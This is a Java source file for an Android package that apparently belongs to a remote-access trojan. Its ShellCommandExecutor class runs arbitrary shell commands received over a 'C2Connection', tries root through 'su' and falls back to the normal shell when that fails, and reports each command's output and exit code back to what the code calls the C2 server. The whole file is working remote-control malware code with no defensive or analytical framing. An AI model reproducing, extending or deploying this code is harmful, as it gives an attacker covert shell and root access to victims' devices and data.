package com.tarjon.admin.utils;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.tarjon.admin.network.C2Connection;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

/**
 * Executes shell commands and returns the output
 */
public class ShellCommandExecutor {
    private static final String TAG = "ShellCommandExecutor";
    
    private final Context context;
    private final C2Connection c2Connection;
    private final ExecutorService executor;
    
    // Default command timeout (in seconds)
    private static final int DEFAULT_TIMEOUT = 60;
    
    public ShellCommandExecutor(Context context, C2Connection c2Connection) {
        this.context = context;
        this.c2Connection = c2Connection;
        this.executor = Executors.newCachedThreadPool();
    }
    
    /**
     * Execute a shell command asynchronously
     * @param command Command to execute
     */
    public void executeCommand(String command) {
        executeCommand(command, DEFAULT_TIMEOUT, null);
    }
    
    /**
     * Execute a shell command asynchronously with a timeout
     * @param command Command to execute
     * @param timeoutSeconds Timeout in seconds
     */
    public void executeCommand(String command, int timeoutSeconds) {
        executeCommand(command, timeoutSeconds, null);
    }
    
    /**
     * Execute a shell command asynchronously with a timeout and callback
     * @param command Command to execute
     * @param timeoutSeconds Timeout in seconds
     * @param callback Callback for command results
     */
    public void executeCommand(String command, int timeoutSeconds, ShellCallback callback) {
        executor.execute(() -> {
            Process process = null;
            
            try {
                // Send start notification
                c2Connection.sendCommandResult("shell_command", 
                        "Executing: " + command);
                
                if (callback != null) {
                    callback.onStart(command);
                }
                
                // Start process
                process = Runtime.getRuntime().exec("sh");
                DataOutputStream outputStream = new DataOutputStream(process.getOutputStream());
                
                // Write command to shell
                outputStream.writeBytes(command + "\n");
                outputStream.writeBytes("exit\n");
                outputStream.flush();
                
                // Read stdout and stderr
                StreamGobbler stdOutGobbler = new StreamGobbler(process.getInputStream(), "STDOUT");
                StreamGobbler stdErrGobbler = new StreamGobbler(process.getErrorStream(), "STDERR");
                
                // Start reading threads
                stdOutGobbler.start();
                stdErrGobbler.start();
                
                // Wait for process to finish with timeout
                boolean completed = process.waitFor(timeoutSeconds, TimeUnit.SECONDS);
                
                if (!completed) {
                    // Command timed out
                    process.destroy();
                    
                    String errorMsg = "Command timed out after " + timeoutSeconds + " seconds";
                    c2Connection.sendCommandResult("shell_command_error", errorMsg);
                    
                    if (callback != null) {
                        callback.onError(errorMsg);
                    }
                    
                    return;
                }
                
                // Wait for output readers to finish
                stdOutGobbler.join();
                stdErrGobbler.join();
                
                // Get command output
                String stdOut = stdOutGobbler.getOutput();
                String stdErr = stdErrGobbler.getOutput();
                int exitCode = process.exitValue();
                
                // Create result object
                JSONObject result = new JSONObject();
                result.put("command", command);
                result.put("stdout", stdOut);
                result.put("stderr", stdErr);
                result.put("exitCode", exitCode);
                result.put("success", exitCode == 0);
                result.put("executionTime", System.currentTimeMillis());
                
                // Send result to C2 server
                c2Connection.sendCommandResult("shell_command_result", 
                        "Command executed with exit code " + exitCode, 
                        result.toString());
                
                // Send to callback
                if (callback != null) {
                    callback.onComplete(exitCode, stdOut, stdErr);
                }
                
            } catch (IOException e) {
                Log.e(TAG, "Error executing command: " + e.getMessage());
                
                String errorMsg = "Error executing command: " + e.getMessage();
                c2Connection.sendCommandResult("shell_command_error", errorMsg);
                
                if (callback != null) {
                    callback.onError(errorMsg);
                }
                
            } catch (InterruptedException e) {
                Log.e(TAG, "Command execution interrupted: " + e.getMessage());
                
                String errorMsg = "Command execution interrupted: " + e.getMessage();
                c2Connection.sendCommandResult("shell_command_error", errorMsg);
                
                if (callback != null) {
                    callback.onError(errorMsg);
                }
                
            } catch (JSONException e) {
                Log.e(TAG, "Error creating JSON result: " + e.getMessage());
                
                if (callback != null) {
                    callback.onError("Error creating JSON result: " + e.getMessage());
                }
                
            } finally {
                if (process != null) {
                    process.destroy();
                }
            }
        });
    }
    
    /**
     * Execute a command with root privileges (if available)
     * @param command Command to execute
     * @param callback Callback for command results
     */
    public void executeRootCommand(String command, ShellCallback callback) {
        executor.execute(() -> {
            Process process = null;
            
            try {
                // Try to get root access
                process = Runtime.getRuntime().exec("su");
                DataOutputStream outputStream = new DataOutputStream(process.getOutputStream());
                
                // Send start notification
                c2Connection.sendCommandResult("shell_command", 
                        "Executing with root: " + command);
                
                if (callback != null) {
                    callback.onStart(command);
                }
                
                // Write command to shell
                outputStream.writeBytes(command + "\n");
                outputStream.writeBytes("exit\n");
                outputStream.flush();
                
                // Read stdout and stderr
                StreamGobbler stdOutGobbler = new StreamGobbler(process.getInputStream(), "STDOUT");
                StreamGobbler stdErrGobbler = new StreamGobbler(process.getErrorStream(), "STDERR");
                
                // Start reading threads
                stdOutGobbler.start();
                stdErrGobbler.start();
                
                // Wait for process to finish with timeout
                boolean completed = process.waitFor(DEFAULT_TIMEOUT, TimeUnit.SECONDS);
                
                if (!completed) {
                    // Command timed out
                    process.destroy();
                    
                    String errorMsg = "Root command timed out after " + DEFAULT_TIMEOUT + " seconds";
                    c2Connection.sendCommandResult("shell_command_error", errorMsg);
                    
                    if (callback != null) {
                        callback.onError(errorMsg);
                    }
                    
                    return;
                }
                
                // Wait for output readers to finish
                stdOutGobbler.join();
                stdErrGobbler.join();
                
                // Get command output
                String stdOut = stdOutGobbler.getOutput();
                String stdErr = stdErrGobbler.getOutput();
                int exitCode = process.exitValue();
                
                // Create result object
                JSONObject result = new JSONObject();
                result.put("command", command);
                result.put("stdout", stdOut);
                result.put("stderr", stdErr);
                result.put("exitCode", exitCode);
                result.put("success", exitCode == 0);
                result.put("executionTime", System.currentTimeMillis());
                result.put("root", true);
                
                // Send result to C2 server
                c2Connection.sendCommandResult("shell_command_result", 
                        "Root command executed with exit code " + exitCode, 
                        result.toString());
                
                // Send to callback
                if (callback != null) {
                    callback.onComplete(exitCode, stdOut, stdErr);
                }
                
            } catch (IOException e) {
                Log.e(TAG, "Error executing root command: " + e.getMessage());
                
                // Try without root if failed
                c2Connection.sendCommandResult("shell_command_error", 
                        "Root access denied, trying without root...");
                
                executeCommand(command, DEFAULT_TIMEOUT, callback);
                
            } catch (InterruptedException e) {
                Log.e(TAG, "Root command execution interrupted: " + e.getMessage());
                
                String errorMsg = "Root command execution interrupted: " + e.getMessage();
                c2Connection.sendCommandResult("shell_command_error", errorMsg);
                
                if (callback != null) {
                    callback.onError(errorMsg);
                }
                
            } catch (JSONException e) {
                Log.e(TAG, "Error creating JSON result: " + e.getMessage());
                
                if (callback != null) {
                    callback.onError("Error creating JSON result: " + e.getMessage());
                }
                
            } finally {
                if (process != null) {
                    process.destroy();
                }
            }
        });
    }
    
    /**
     * Execute a shell command synchronously and return the output
     * @param command Command to execute
     * @return CommandResult with stdout, stderr, and exit code
     */
    public CommandResult executeCommandSync(String command) throws IOException, InterruptedException {
        Process process = Runtime.getRuntime().exec("sh");
        DataOutputStream outputStream = new DataOutputStream(process.getOutputStream());
        
        // Write command to shell
        outputStream.writeBytes(command + "\n");
        outputStream.writeBytes("exit\n");
        outputStream.flush();
        
        // Read stdout and stderr
        StreamGobbler stdOutGobbler = new StreamGobbler(process.getInputStream(), "STDOUT");
        StreamGobbler stdErrGobbler = new StreamGobbler(process.getErrorStream(), "STDERR");
        
        // Start reading threads
        stdOutGobbler.start();
        stdErrGobbler.start();
        
        // Wait for process to finish
        int exitCode = process.waitFor();
        
        // Wait for output readers to finish
        stdOutGobbler.join();
        stdErrGobbler.join();
        
        // Get command output
        String stdOut = stdOutGobbler.getOutput();
        String stdErr = stdErrGobbler.getOutput();
        
        process.destroy();
        
        return new CommandResult(command, stdOut, stdErr, exitCode);
    }
    
    /**
     * Thread to read process output streams
     */
    private static class StreamGobbler extends Thread {
        private final BufferedReader reader;
        private final String type;
        private final StringBuilder output = new StringBuilder();
        
        StreamGobbler(java.io.InputStream inputStream, String type) {
            this.reader = new BufferedReader(new InputStreamReader(inputStream));
            this.type = type;
        }
        
        @Override
        public void run() {
            try {
                String line;
                while ((line = reader.readLine()) != null) {
                    if (output.length() > 0) {
                        output.append("\n");
                    }
                    output.append(line);
                }
            } catch (IOException e) {
                Log.e("StreamGobbler", "Error reading " + type + ": " + e.getMessage());
            }
        }
        
        public String getOutput() {
            return output.toString();
        }
    }
    
    /**
     * Result object for synchronous command execution
     */
    public static class CommandResult {
        private final String command;
        private final String stdout;
        private final String stderr;
        private final int exitCode;
        
        public CommandResult(String command, String stdout, String stderr, int exitCode) {
            this.command = command;
            this.stdout = stdout;
            this.stderr = stderr;
            this.exitCode = exitCode;
        }
        
        public String getCommand() {
            return command;
        }
        
        public String getStdout() {
            return stdout;
        }
        
        public String getStderr() {
            return stderr;
        }
        
        public int getExitCode() {
            return exitCode;
        }
        
        public boolean isSuccess() {
            return exitCode == 0;
        }
        
        public JSONObject toJson() throws JSONException {
            JSONObject json = new JSONObject();
            json.put("command", command);
            json.put("stdout", stdout);
            json.put("stderr", stderr);
            json.put("exitCode", exitCode);
            json.put("success", isSuccess());
            return json;
        }
    }
    
    /**
     * Callback interface for shell command execution
     */
    public interface ShellCallback {
        void onStart(String command);
        void onComplete(int exitCode, String stdout, String stderr);
        void onError(String error);
    }
    
    /**
     * Clean up resources
     */
    public void release() {
        if (executor != null && !executor.isShutdown()) {
            executor.shutdownNow();
        }
    }
}